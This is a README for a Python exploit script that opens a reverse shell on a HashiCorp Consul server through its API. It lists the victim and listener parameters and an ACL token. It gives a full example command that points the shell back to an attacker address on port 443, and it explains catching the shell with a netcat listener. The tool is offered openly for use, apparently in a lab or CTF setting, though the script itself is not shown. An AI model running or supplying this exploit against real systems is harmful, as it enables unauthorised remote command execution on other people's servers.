## This exploit helps you to get a reverse shell, exploiting the Hashicorp-Consul service via API, not using tools like metasploit

· When executing the script with python3 it asks us for a series of parameters
    
    - rhost: remote host (ip of the victim machine)
    - rport: remote port (port used by the consul api, by default this service always uses 8500)
    - lhost: local host (local ip of the interface where we will receive the shell)
    - lport: local port (port where we will be waiting for the shell with a listener like netcat)
    - acl_token: token needed for authentication against the api using it as header

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit1.png">


· If we have what is necessary, we can give it the arguments and run it, example:

    python3 exploit.py 127.0.0.1 8500 10.10.14.29 443 bb03b43b-1d81-d62b-24b5-39540ee469b5


· When executing the script with its arguments we should see a message with a + which indicates that the request has been sent correctly

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit2.png">


· Checking your listener, in a couple of seconds you should get a shell as the user running the service

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit3.png">


· In case it detects that it cannot connect to the host, it will give a message, check the port is exposed and use port forwarding if necessary, then try again

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit4.png">
